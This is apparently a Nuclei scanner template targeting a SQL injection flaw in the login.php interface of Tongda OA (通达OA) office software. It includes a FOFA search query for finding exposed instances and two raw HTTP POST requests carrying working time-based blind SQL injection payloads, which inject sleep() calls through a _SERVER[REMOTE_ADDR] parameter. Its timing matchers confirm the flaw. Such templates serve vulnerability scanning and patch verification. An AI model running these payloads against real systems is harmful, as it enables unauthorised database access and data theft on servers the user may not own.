id: tongda-oa-login-sqli
info:
  name: 通达OA login.php接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
      通达OA系统在login.php接口中存在SQL注入漏洞，攻击者可通过构造恶意输入参数绕过输入验证机制，向数据库注入恶意SQL代码。该漏洞允许远程攻击者在未授权情况下执行任意SQL查询，可能导致敏感数据泄露、数据完整性破坏或系统权限提升。
  tags: 通达OA
http:
- raw:
  - |
    POST /ispirit/interface/login.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=1; KEY_RANDOMDATA=1858
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+sleep(5)+limit+0,1))--+
  - |
    POST /ispirit/interface/login.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=1; KEY_RANDOMDATA=1858
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+sleep(8)+limit+0,1))--+
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
